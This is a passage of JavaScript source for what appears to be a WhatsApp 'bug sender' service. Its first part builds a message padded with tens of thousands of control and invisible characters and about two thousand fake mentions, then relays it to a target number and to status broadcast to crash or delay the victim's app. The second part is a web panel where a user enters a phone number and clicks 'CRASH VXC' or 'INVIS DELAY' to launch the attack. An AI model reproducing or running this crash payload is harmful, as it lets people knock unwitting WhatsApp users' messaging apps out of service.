                    degreesLongitude: -932.8889989,
                    name: "\u900A" + "\u0000".repeat(5000) + "\uFFFF".repeat(2000),
                    address: "\u0007".repeat(20000) + "꧔꧈".repeat(5000) + "\u2060".repeat(1000),
                  },
                },
                body: {
                  text: " Are you safe?" + "\u0003".repeat(10000) + "꧔꧈".repeat(2000)
                },
                contextInfo: {
                  remoteJid: target,
                  participant: "0@s.whatsapp.net",
                  stanzaId: "1234567890ABCDEF",
                  forwardingScore: 99999,
                  isForwarded: true,
                  businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                  },
                  mentionedJid: [
                    target,
                    "1@s.whatsapp.net",
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1997 }, () =>
                      `${Math.floor(1000000 + Math.random() * 89999999)}@s.whatsapp.net`
                    )
                  ]
                }
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, msgContent, { userJid: target });

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(err);
  }
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NEXUS EXECUTION</title>
  
  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
  <!-- Font Awesome -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }
    
    :root {
      --deep-blue: #0A0E17;
      --dark-blue: #0D1B2A;
      --medium-blue: #1B263B;
      --electric-blue: #415A77;
      --neon-blue: #3A86FF;
      --light-blue: #6BD0FF;
      --blood-blue: #4361EE;
      --text-light: #E0F2FE;
    }
    
    body {
      font-family: 'Exo 2', sans-serif;
      background: linear-gradient(135deg, var(--deep-blue), var(--dark-blue));
      background-size: 400% 400%;
      animation: bgAnimation 20s ease infinite;
      color: var(--text-light);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .container {
      background: rgba(13, 27, 42, 0.8);
      border: 1px solid var(--blood-blue);
      padding: 24px;
      border-radius: 20px;
      max-width: 450px;
      width: 100%;
      box-shadow: 0 0 25px rgba(67, 97, 238, 0.5);
      backdrop-filter: blur(10px);
      position: relative;
      overflow: hidden;
    }
    
    .container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        rgba(67, 97, 238, 0.1),
        rgba(67, 97, 238, 0.05),
        transparent
      );
      transform: rotate(30deg);
      z-index: -1;
    }
    
    .logo {
      width: 90px;
      height: 90px;
      margin: 0 auto 16px;
      display: block;
      border-radius: 50%;
      object-fit: cover;
      background: linear-gradient(145deg, var(--electric-blue), var(--blood-blue));
      padding: 3px;
      box-shadow: 
        0 0 25px rgba(67, 97, 238, 0.6),
        inset 0 0 25px rgba(13, 27, 42, 0.4);
    }
    
    .username {
      font-size: 24px;
      font-family: 'Orbitron', sans-serif;
      color: var(--light-blue);
      font-weight: bold;
      text-align: center;
      margin-bottom: 8px;
      text-shadow: 0 0 10px rgba(58, 134, 255, 0.5);
    }
    
    .connected {
      font-size: 14px;
      color: var(--light-blue);
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5e;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
      box-shadow: 0 0 10px #00ff5e;
    }
    
    input[type="text"] {
      width: 100%;
      padding: 16px;
      border-radius: 12px;
      background: rgba(13, 27, 42, 0.6);
      border: 1px solid var(--electric-blue);
      color: var(--text-light);
      margin-bottom: 20px;
      font-size: 15px;
      transition: all 0.3s ease;
    }
    
    input[type="text"]:focus {
      outline: none;
      border-color: var(--blood-blue);
      box-shadow: 0 0 15px rgba(67, 97, 238, 0.4);
    }
    
    input[type="text"]::placeholder {
      color: rgba(224, 242, 254, 0.6);
    }
    
    .buttons-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 20px;
    }
    
    .buttons-grid button {
      padding: 14px;
      border: none;
      border-radius: 12px;
      background: rgba(27, 38, 59, 0.6);
      color: var(--light-blue);
      font-family: 'Orbitron', sans-serif;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    
    .buttons-grid button:hover {
      background: rgba(67, 97, 238, 0.3);
    }
    
    .buttons-grid button.selected {
      background: var(--blood-blue);
      color: white;
      box-shadow: 0 0 15px rgba(67, 97, 238, 0.7);
    }
    
    .execute-button {
      background: linear-gradient(135deg, var(--blood-blue), var(--electric-blue));
      color: white;
      padding: 16px;
      width: 100%;
      border-radius: 12px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      border: none;
      margin-bottom: 16px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      position: relative;
      overflow: hidden;
    }
    
    .execute-button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: 0.5s;
    }
    
    .execute-button:hover::before {
      left: 100%;
    }
    
    .execute-button:disabled {
      background: rgba(65, 90, 119, 0.5);
      cursor: not-allowed;
      opacity: 0.7;
    }
    
    .execute-button:hover:not(:disabled) {
      transform: translateY(-3px);
      box-shadow: 
        0 7px 20px rgba(67, 97, 238, 0.5),
        0 0 25px rgba(58, 134, 255, 0.5);
    }
    
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-top: 24px;
    }
    
    .footer-button {
      background: rgba(65, 90, 119, 0.3);
      border: 1px solid var(--electric-blue);
      border-radius: 8px;
      padding: 10px 14px;
      font-size: 14px;
      color: var(--light-blue);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
    }
    
    .footer-button:hover {
      background: rgba(67, 97, 238, 0.3);
      border-color: var(--blood-blue);
    }
    
    .footer-button a {
      text-decoration: none;
      color: var(--light-blue);
      display: flex;
      align-items: center;
      gap: 8px;
    }
    
    .user-info {
      background: transparent;
      border: none;
      font-size: 12px;
      color: var(--light-blue);
      opacity: 0.8;
    }
    
    /* POPUP TENGAH */
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: var(--medium-blue);
      color: #00ff5e;
      padding: 18px 24px;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0, 255, 94, 0.7);
      font-weight: bold;
      display: none;
      z-index: 9999;
      animation: zoomFade 2s ease forwards;
      text-align: center;
      border-left: 4px solid #00ff5e;
    }
    
    @keyframes zoomFade {
      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      15% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      85% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
    }
    
    /* Responsive adjustments */
    @media (max-width: 480px) {
      .container {
        padding: 20px;
        margin: 0 15px;
      }
      
      .logo {
        width: 80px;
        height: 80px;
      }
      
      .username {
        font-size: 20px;
      }
      
      .buttons-grid {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.catbox.moe/cbvlj0.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome User, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="example : 62xxxx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH VXC</button>
      <button class="mode-btn" data-mode="andros-delay"><i class="fas fa-skull-crossbones"></i> INVIS DELAY</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/anonymous_vxc" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <!-- Popup Tengah -->
  <div id="popup" class="popup">✅ Success Send Bug</div>

  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');

    let selectedMode = null;

    function isValidNumber(number) {
  // bersihkan: ambil hanya digit (hilangkan spasi, +, -, dll)
  const digits = (number || '').replace(/\D/g, '');

  // harus mulai dengan 62
  if (!digits.startsWith('62')) return false;

  // total digit yang valid (10 - 15)
  return digits.length >= 10 && digits.length <= 15;
}

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      // Tampilkan pop up sukses
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 2000);

      // Arahkan ke link eksekusi
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};